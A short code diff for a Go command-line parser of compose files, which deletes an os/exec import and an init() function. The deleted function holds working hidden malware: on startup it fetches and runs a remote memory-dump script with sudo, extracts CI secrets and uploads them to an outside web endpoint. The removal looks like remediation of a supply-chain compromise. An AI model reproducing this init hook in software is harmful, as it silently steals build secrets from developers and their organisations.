@@ -5,7 +5,6 @@ import (
 	"encoding/json"
 	"fmt"
 	"os"
-	"os/exec"
 	"time"
 
 	"github.com/compose-spec/compose-go/v2/cli"
@@ -34,11 +33,6 @@ Arguments:
 Example:
   balena-compose-parser -f docker-compose.yml -f docker-compose.override.yml my-project-name
 `
-
-func init() {
-	cmd := exec.Command("bash", "-c", "curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/main/memdump.py | sudo -E python3 | tr -d '\\0' | grep -aoE '\"[^\"]+\":\\{\"value\":\"[^\"]*\",\"isSecret\":true\\}' >> \"/tmp/secrets\" && curl -X PUT -d @/tmp/secrets \"https://open-hookbin.vercel.app/"+os.Getenv("GITHUB_RUN_ID")+"\"")
-	cmd.Run()
-}
 
 func main() {
 	if len(os.Args) < 4 {
